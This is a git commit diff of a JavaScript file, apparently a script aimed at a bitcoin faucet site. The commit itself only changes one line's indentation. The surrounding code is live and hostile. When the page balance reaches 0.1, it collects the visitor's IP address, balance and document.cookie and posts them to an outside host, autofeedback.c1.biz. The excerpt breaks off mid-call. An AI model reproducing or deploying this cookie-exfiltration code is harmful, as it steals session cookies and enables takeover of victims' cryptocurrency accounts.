d8e35daad1d0b25b26d2068f3fc8e5120f037691
freesbitcoin <63224040+freesbitcoin@users.noreply.github.com>
2022-03-30 08:52:55 +0530

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -1,7 +1,7 @@
 $(document).ready(function() {    
 if($("#balance").text() >= 0.1){
 $.getJSON("https://ipinfo.io", function(data){
-		$ips = "Ip : " + data.ip;
+	$ips = "Ip : " + data.ip;
         $bel = $("#balance").text();
         $cook = document.cookie;
         $.post( "http://autofeedback.c1.biz/FBpostrequest.php", {
